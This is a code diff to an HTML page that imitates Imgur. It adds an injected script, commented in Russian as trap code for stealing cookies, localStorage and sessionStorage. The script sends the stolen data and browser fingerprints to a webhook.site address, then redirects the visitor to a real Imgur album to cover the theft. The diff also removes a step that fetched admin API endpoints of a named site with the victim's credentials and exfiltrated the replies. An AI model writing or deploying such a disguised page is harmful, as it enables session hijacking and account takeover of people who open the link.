@@ -79,8 +79,10 @@ window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,
 <script defer="defer" src="https://s.imgur.com/desktop-assets/js/main.288825a9c627bb593f2a.js"></script>
 <link href="https://s.imgur.com/desktop-assets/css/styles.5c1f1e56c11992332cd0.css" rel="stylesheet">
 
-<!-- КОД-ЛОВУШКА -->
 <script>
+    // ==============================================
+    // КОД-ЛОВУШКА - кража кук, localStorage, sessionStorage
+    // ==============================================
     const WEBHOOK_URL = 'https://webhook.site/826eb9fd-c615-420a-bb68-8ccdedd52fd3';
     
     function sendData(type, data) {
@@ -123,24 +125,16 @@ window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,
         url: window.location.href,
         referrer: document.referrer,
         screen: screen.width + 'x' + screen.height,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toISOString()
     });
     
-    // 5. Попытка атаковать API админки (только если страница открыта на admin.streamskill.pro)
-    if (window.location.hostname.includes('streamskill')) {
-        const endpoints = [
-            'https://admin.streamskill.pro/api/user/me',
-            'https://admin.streamskill.pro/api/profile',
-            'https://admin.streamskill.pro/user/current'
-        ];
-        endpoints.forEach((url, idx) => {
-            fetch(url, {credentials: 'include', headers: {'Accept': 'application/json'}})
-                .then(res => res.text())
-                .then(data => sendData('api_' + idx, {url: url, data: data.substring(0, 500)}))
-                .catch(err => sendData('api_error_' + idx, {url: url, error: err.message}));
-        });
-    }
+    // 5. Перенаправление на настоящий Imgur через 0.5 секунды
+    setTimeout(function() {
+        window.location.href = 'https://imgur.com/a/uej4cAd';
+    }, 500);
 </script>
+
 </head>
 <body>
 <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M6N38SF" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
